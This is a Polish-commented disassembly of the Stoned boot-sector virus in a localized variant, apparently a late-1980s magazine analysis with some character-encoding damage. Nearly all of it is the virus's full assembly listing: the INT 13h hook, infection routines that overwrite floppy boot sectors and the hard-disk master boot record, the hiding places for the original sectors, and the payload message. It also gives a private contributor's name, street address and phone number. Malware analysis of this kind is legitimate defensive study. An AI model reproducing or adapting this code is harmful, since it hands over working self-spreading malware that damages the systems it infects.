;----------------------------------------------------------------------------
; Wirus dostarczony Grzegorzowi Eiderowi do redakcji  KOMPUTERA w poíowie 
; listopada 1989. DostawcÜ jest ußytkownik z Wiednia:
;
;   Karol Grabski 
;   Vien 
;   Krummgasse 3/18 
;   tel. 7133735 
;
; SCAN 0.4V35 identyfikuje go jako: STONED VIRUS 
; Wirus ma spolszczony komunikat! Oryginalny jest chyba díußszy i nawiÜzuje
; do legalizacji marihuany
; 
; Na dyskietce wirus rezyduje w boot sector, oryginalny boot sektor chowa do 
; ostatniego sektora zajmowanego przez katalog gí¢wny dyskietki.
; Na dysku twardym wirus rezyduje w master boot sektor twardego dysku a 
; oryginaí chowa do 7 sektora ûcießki 0, strona 0 (czyli poza zasiëgiem DOS)
;-----------------------------------------------------------------------------

; Postaç wirusa bezpoûrednio po wczytaniu do pamiëci z dyskietki

; bajty identyfikujÜce wirusa (w jego wíasnym autoteûcie)

07C0:0000 EA0500C007    JMP     07C0:0005  ; skok do nastëpnej instrukcji
07C0:0005 E99900        JMP     00A1

; normalnie w tym obszarze sÜ dane dyskietki, ten wirus, jak widaç, tym sië
; nie przejmuje i traktuje ten obszar jako roboczy

07C0:0008  00             ; flaga 0 - oznacza start z dyskietki, 2 - z twardego
07C0:0009  69 A0 00 F0    ; oryginalny adres INT 13h
07C0:000D  E4 00 80 9F    ; adres wirusa w pamiëci operacyjnej
07C0:0011  00 7C 00 00    ; address of boot sector in memory

;-------------------------------------------------------
; Nowa obsíuga INT 13h
;-------------------------------------------------------

07C0:0015 1E            PUSH    DS
07C0:0016 50            PUSH    AX
07C0:0017 80FC02        CMP     AH,02        ; ponißej 'odczyt sektora'
07C0:001A 7217          JB      0033         ; nieciekawa funkcja

07C0:001C 80FC04        CMP     AH,04        ; powyßej 'zapis sektora'
07C0:001F 7312          JAE     0033         ; nieciekawa funkcja

07C0:0021 0AD2          OR      DL,DL        ; nr dysku
07C0:0023 750E          JNZ     0033         ; r¢ßny od A

07C0:0025 33C0          XOR     AX,AX
07C0:0027 8ED8          MOV     DS,AX
07C0:0029 A03F04        MOV     AL,[043F]    ; diskette drive motor status
07C0:002C A801          TEST    AL,01        ; motor 1 on
07C0:002E 7503          JNZ     0033         ; nie tym razem
07C0:0030 E80700        CALL    003A
07C0:0033 58            POP     AX
07C0:0034 1F            POP     DS
07C0:0035 2E            CS:
07C0:0036 FF2E0900      JMP     FAR [0009]   ; oryginalne INT 13h

07C0:003A 53            PUSH    BX           ; przechowaj rejestry
07C0:003B 51            PUSH    CX
07C0:003C 52            PUSH    DX
07C0:003D 06            PUSH    ES
07C0:003E 56            PUSH    SI
07C0:003F 57            PUSH    DI

07C0:0040 BE0400        MOV     SI,0004      ; licznik pr¢b
07C0:0043 B80102        MOV     AX,0201      ; odczyt sektora
07C0:0046 0E            PUSH    CS
07C0:0047 07            POP     ES
07C0:0048 BB0002        MOV     BX,0200      ; za wíasny kod
07C0:004B 33C9          XOR     CX,CX
07C0:004D 8BD1          MOV     DX,CX
07C0:004F 41            INC     CX           ; boot sektor dysku A ?
07C0:0050 9C            PUSHF
07C0:0051 2E            CS:
07C0:0052 FF1E0900      CALL    FAR [0009]   ; oryginalne INT 13h
07C0:0056 730E          JAE     0066         ; odczyt udany

07C0:0058 33C0          XOR     AX,AX        ; resetuj dysk
07C0:005A 9C            PUSHF
07C0:005B 2E            CS:
07C0:005C FF1E0900      CALL    FAR [0009]   ; oryginalne INT 13h
07C0:0060 4E            DEC     SI
07C0:0061 75E0          JNZ     0043         ; ponawiaj pr¢bë odczytu

07C0:0063 EB35          JMP     009A         ; wycofujemy sië
07C0:0065 90            NOP

07C0:0066 33F6          XOR     SI,SI        ; sprawd¶ czy zainfekowany?
07C0:0068 BF0002        MOV     DI,0200
07C0:006B FC            CLD
07C0:006C 0E            PUSH    CS
07C0:006D 1F            POP     DS
07C0:006E AD            LODSW
07C0:006F 3B05          CMP     AX,[DI]
07C0:0071 7506          JNZ     0079         ; jeszcze nie

07C0:0073 AD            LODSW
07C0:0074 3B4502        CMP     AX,[DI+02]
07C0:0077 7421          JZ      009A         ; wycofuj sië

; infekcja dyskietki

07C0:0079 B80103        MOV     AX,0301      ; zapisuj sektor na dysk
07C0:007C BB0002        MOV     BX,0200      ; z ES:BX
07C0:007F B103          MOV     CL,03        ; do sektora 3
07C0:0081 B601          MOV     DH,01        ; na stronie 1
07C0:0083 9C            PUSHF                ; czyli ostatni sektor zajmowany
07C0:0084 2E            CS:                  ; przez 'root directory'
07C0:0085 FF1E0900      CALL    FAR [0009]   ; oryginalne INT 13h
07C0:0089 720F          JB      009A

07C0:008B B80103        MOV     AX,0301      ; zapisuj sektor na dysk
07C0:008E 33DB          XOR     BX,BX        ; ES:0 czyli wirusa
07C0:0090 B101          MOV     CL,01        ; sektor 0
07C0:0092 33D2          XOR     DX,DX        ; strona 0 dysk 0
07C0:0094 9C            PUSHF                ; czyli jako nowy 'boot sector'
07C0:0095 2E            CS:
07C0:0096 FF1E0900      CALL    FAR [0009]   ; oryginalne INT 13h

07C0:009A 5F            POP     DI           ; koniec ûwi§stw
07C0:009B 5E            POP     SI
07C0:009C 07            POP     ES
07C0:009D 5A            POP     DX
07C0:009E 59            POP     CX
07C0:009F 5B            POP     BX
07C0:00A0 C3            RET

;----------------------------------------
; kod startowy wirusa
;----------------------------------------

07C0:00A1 33C0          XOR     AX,AX       ; inicjuj rejestry i stos
07C0:00A3 8ED8          MOV     DS,AX
07C0:00A5 FA            CLI
07C0:00A6 8ED0          MOV     SS,AX
07C0:00A8 BC007C        MOV     SP,7C00

07C0:00AB FB            STI
07C0:00AC A14C00        MOV     AX,[004C]   ; odczyt wektora INT 13h
07C0:00AF A3097C        MOV     [7C09],AX
07C0:00B2 A14E00        MOV     AX,[004E]
07C0:00B5 A30B7C        MOV     [7C0B],AX
07C0:00B8 A11304        MOV     AX,[0413]   ; rozmiar pamiëci operacyjnej w KB
07C0:00BB 48            DEC     AX          ; szykuj miejsce dla wirusa
07C0:00BC 48            DEC     AX
07C0:00BD A31304        MOV     [0413],AX   ; informacja dla DOS

07C0:00C0 B106          MOV     CL,06       ; przelicz na paragrafy
07C0:00C2 D3E0          SHL     AX,CL
07C0:00C4 8EC0          MOV     ES,AX       ; segment wirusa 
07C0:00C6 A30F7C        MOV     [7C0F],AX   ; zapamiëtaj segment wirusa
07C0:00C9 B81500        MOV     AX,0015     ; offset nowej obsíugi INT 13h
07C0:00CC A34C00        MOV     [004C],AX
07C0:00CF 8C064E00      MOV     [004E],ES   ; segment nowej obsíugi INT 13h

07C0:00D3 B9B801        MOV     CX,01B8     ; przesu§ kod wirusa
07C0:00D6 0E            PUSH    CS          ; ma to na celu instalacjë
07C0:00D7 1F            POP     DS          ; czëûci rezydentnej
07C0:00D8 33F6          XOR     SI,SI       ; w ko§cu pamiëci operacyjnej
07C0:00DA 8BFE          MOV     DI,SI
07C0:00DC FC            CLD
07C0:00DD F3            REPZ
07C0:00DE A4            MOVSB
07C0:00DF 2E            CS:
07C0:00E0 FF2E0D00      JMP     FAR [000D]  ; skok do przesuniëtego kodu 

; czyli tutaj

07C0:00E4 B80000        MOV     AX,0000     ; resetuj dysk
07C0:00E7 CD13          INT     13

07C0:00E9 33C0          XOR     AX,AX       ; zeruj ES
07C0:00EB 8EC0          MOV     ES,AX
07C0:00ED B80102        MOV     AX,0201     ; czytaj 1 sektor
07C0:00F0 BB007C        MOV     BX,7C00     ; do ES:BX (0:7C00)
07C0:00F3 2E            CS:
07C0:00F4 803E080000    CMP     BYTE PTR [0008],00 ;test flagi (z dyskietki?)
07C0:00F9 740B          JZ      0106        ; sprawdzaj flopa

07C0:00FB B90700        MOV     CX,0007     ; numer sektora ze strony 0
07C0:00FE BA8000        MOV     DX,0080     ; pierwszy twardy dysk
07C0:0101 CD13          INT     13          ; tam jest oryginalny boot sektor
07C0:0103 EB49          JMP     014E        ; koniec dziaíalnoûci wirusa
07C0:0105 90            NOP

07C0:0106 B90300        MOV     CX,0003  ; sektor nr 3 ûcießka 0
07C0:0109 BA0001        MOV     DX,0100  ; strona 1 dysk nr 0 (A)
07C0:010C CD13          INT     13
07C0:010E 723E          JB      014E     ; koniec dziaíalnoûci wirusa

;-----------------------------------------------------------------
; komunikat "Tw¢j PC jest teraz be!" wraz z sygnaíem d¶wiëkowym 
;-----------------------------------------------------------------

07C0:0110 26            ES:
07C0:0111 F6066C0407    TEST    BYTE PTR [046C],07  ; míodsze síowo zegara
07C0:0116 7512          JNZ     012A                ; pomijaj komunikat

07C0:0118 BE8901        MOV     SI,0189   ; adres komunikatu
07C0:011B 0E            PUSH    CS
07C0:011C 1F            POP     DS

07C0:011D AC            LODSB            ; drukowanie komunikatu (ASCIIZ)
07C0:011E 0AC0          OR      AL,AL
07C0:0120 7408          JZ      012A

07C0:0122 B40E          MOV     AH,0E    ; write character (TTY mode)
07C0:0124 B700          MOV     BH,00    ; numer strony video
07C0:0126 CD10          INT     10
07C0:0128 EBF3          JMP     011D     ; pobierz nastëpny znak

;---------------------------------------------------
; kontrola czy twardy dysk systemowy jest czysty?
;---------------------------------------------------

07C0:012A 0E            PUSH    CS
07C0:012B 07            POP     ES
07C0:012C B80102        MOV     AX,0201    ; czytaj 1 sektor dysku
07C0:012F BB0002        MOV     BX,0200    ; do ES:BX za wirusa
07C0:0132 B101          MOV     CL,01      ; numer sektora
07C0:0134 BA8000        MOV     DX,0080    ; pierwszy twardy dysk, strona 0
07C0:0137 CD13          INT     13
07C0:0139 7213          JB      014E       ; problemy!

07C0:013B 0E            PUSH    CS         ; sprawdzaj czy juß zainfekowany
07C0:013C 1F            POP     DS
07C0:013D BE0002        MOV     SI,0200
07C0:0140 BF0000        MOV     DI,0000
07C0:0143 AD            LODSW
07C0:0144 3B05          CMP     AX,[DI]
07C0:0146 7511          JNZ     0159

07C0:0148 AD            LODSW
07C0:0149 3B4502        CMP     AX,[DI+02]
07C0:014C 750B          JNZ     0159

;-----------------------------------------------------
; koniec akcji, kontynuuj wíaûciwy bootstrap
;-----------------------------------------------------

07C0:014E 2E            CS:
07C0:014F C606080000    MOV     BYTE PTR [0008],00  ; flaga 'z dyskietki'
07C0:0154 2E            CS:
07C0:0155 FF2E1100      JMP     FAR [0011]          ; kontynuuj bootstrap

;------------------------------------------------
; infekuj pierwszy twardy dysk
;------------------------------------------------

07C0:0159 2E            CS:
07C0:015A C606080002    MOV     BYTE PTR [0008],02  ; flaga  'z twardego'
07C0:015F B80103        MOV     AX,0301     ; zapisz 1 sektor dyskowy
07C0:0162 BB0002        MOV     BX,0200     ; ES:BX skÜd
07C0:0165 B90700        MOV     CX,0007     ; do sektora nr 7
07C0:0168 BA8000        MOV     DX,0080     ; strona 0 pierwszego dysku twardego
07C0:016B CD13          INT     13
07C0:016D 72DF          JB      014E        ; problemy!

07C0:016F 0E            PUSH    CS          ; uzupeínij wirusa wczytanym kodem
07C0:0170 1F            POP     DS          ; czyli tablicami partycji dysku
07C0:0171 0E            PUSH    CS
07C0:0172 07            POP     ES
07C0:0173 BEBE03        MOV     SI,03BE
07C0:0176 BFBE01        MOV     DI,01BE
07C0:0179 B94202        MOV     CX,0242
07C0:017C F3            REPZ
07C0:017D A4            MOVSB
07C0:017E B80103        MOV     AX,0301     ; zapisz na dysk
07C0:0181 33DB          XOR     BX,BX       ; ES:0 skÜd (caíy wirus)
07C0:0183 FEC1          INC     CL          ; CL := 1 numer sektora 
07C0:0185 CD13          INT     13
07C0:0187 EBC5          JMP     014E        ; koniec

07C0:0189                             07 54 77 A2 6A 20 50            .Tw¢j P
07C0:0190  43 20 6A 65 73 74 20 74-65 72 61 7A 20 62 65 21   C jest teraz be!
07C0:01A0  07 0D 0A 0A 00 4C 45 47-41 4C 49 53 45 20 4D 41   .....LEGALISE MA
07C0:01B0  52 49 4A 55 41 4E 41 3F-00 00 00 00 00 00 00 00   RIJUANA?........
           * 0004 Lines Of 00 Skipped *
07C0:0200  00 00 00 00 00 00 00 00-00                        .........

; Brak oznakowania ko§ca sektora! (55AA)

